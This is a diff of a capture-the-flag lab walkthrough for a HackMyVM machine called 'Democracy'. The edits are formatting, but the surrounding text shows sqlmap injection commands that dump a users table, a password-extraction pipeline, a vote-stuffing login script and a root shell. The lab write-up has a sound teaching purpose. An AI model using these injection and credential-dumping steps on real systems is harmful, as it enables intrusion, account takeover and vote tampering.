@@ -51,7 +51,7 @@ We can see the vote button under each candidate. When we click on this button we
 ![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/login-from.png)
 
 At this point of the assessment we do not have an account on the web application, let's click on *Don't have an account yet* to create a user account.
-![](registration-form.png)
+![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/registration-form.png)
 
 After creating an account we successfully log into the web application which offers options to vote, to view the vote results, or to reset votes. 
 ![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/vote-page.png)
@@ -161,7 +161,6 @@ voting
 ```
 
 At this point,  we have successfully retrieved the databases and the tables present on the target MySQL instance. We can see in our result that a non-default database named voting, this database appears to contain an interesting table named users. 
-
 ```bash
 ┌──(pentester㉿kali)-[~/Democracy/Scans/Web]                         
 └─$sqlmap http://10.0.2.19/vote.php -X POST -H 'Cookie: PHPSESSID=90jt0r5s8i3s1o2u5iufi2h6rj; voted=1' --data 'candidate=democ' --delay=0.5 -D voting  -T users --columns        
@@ -223,6 +222,7 @@ Now that we have the username and passwords of the electors, we can influence th
 ┌──(pentester㉿kali)-[~/Democracy/Misc Files]
 └─$head -n 1001 /home/pentester/.local/share/sqlmap/output/10.0.2.19/dump/voting/users.csv | cut -d "," -f2,3  > user-pass.txt
 ```
+
 Also, it was mentioned by the Democratic party that they support the idea of free and open sharing of digital data and FTP servers. Let's vote for this party and see if they will keep their promise. The Python code below automatically logs into each account present in the **user-pass.txt** file created above and votes for Democrat.
 
 ```python
@@ -243,12 +243,13 @@ with open("user-pass.txt", "r") as file:
     
     print(f"[+] The candidate democrat has {numb_votes} votes")
 ```
+
 After the script completes, we can click on view votes and we will be redirected to the systemopening.php page. From the name of this page, we can deduce that the democratic party kept its promises and exposed the FTP server to the public.
 ![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/after-1000-vote.png)
 
 ## Post Exploitation
-Let's perform a new service scan on the target to identify the port where the FTP server is running.
 
+Let's perform a new service scan on the target to identify the port where the FTP server is running.
 ```bash
 ┌──(pentester㉿kali)-[~/Democracy/Scans/Service]
 └─$nmap -sC -sV 10.0.2.19 -oN service-scan-2.nmap
@@ -359,7 +360,6 @@ root@democracy:~#
 ```
 
 After obtaining the tty shell we can see that we are logged in as root. We can confirm this by using the **whoami** command on the system as seen below. We can now use this access to read both the user and the root flag.
-
 ```bash
 root@democracy:~# whoami
 root
@@ -371,4 +371,5 @@ root@democracy:~#
 ```
 
 ## Conclusion
+
 Congratulations! In this walkthrough, you have exploited an SQL injection vulnerability in a web application that did not properly sanitise input data. This machine illustrates the critical risks of failing to properly sanitise user input before incorporating it into SQL queries. It also highlights the dangers of hosting sensitive information, such as automation scripts, with open permissions on FTP servers with anonymous login enabled. By understanding these vulnerabilities, we can better protect our systems from potential threats. Thank you for following up on this walkthrough.
